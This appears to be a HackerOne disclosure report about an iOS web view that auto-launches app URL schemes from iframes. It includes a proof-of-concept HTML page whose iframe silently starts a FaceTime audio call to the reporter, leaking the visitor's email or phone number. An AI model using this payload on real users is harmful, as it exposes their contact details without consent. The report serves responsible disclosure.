# HackerOne Report: iOS App can establish Facetime calls without user's permission
**Report ID:** 28500
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
When URL Schemes for local applications are inserted in an inline frame, the web view launches them automatically.

###Example###: 


    <html>
    <header><title>Facetime Audio URL Scheme Test</title></header>
    <body>
    <iframe src="facetime-audio://guillaume@binaryfactory.ca"></iframe>
    </body>
    </html>

This page ( which you can also find at http://binaryfactory.ca/urlschemes/facetime.html ) - when loaded from Twitter on iOS (including 8), automatically establishes a Facetime Audio call to me, leaking the user's email address or phone number (caller ID information for their Facetime account).

I marked this as a CSRF but that isn't technically correct, but it is similar in behavior.

Thank you.

## Discussion & Remediation Timeline
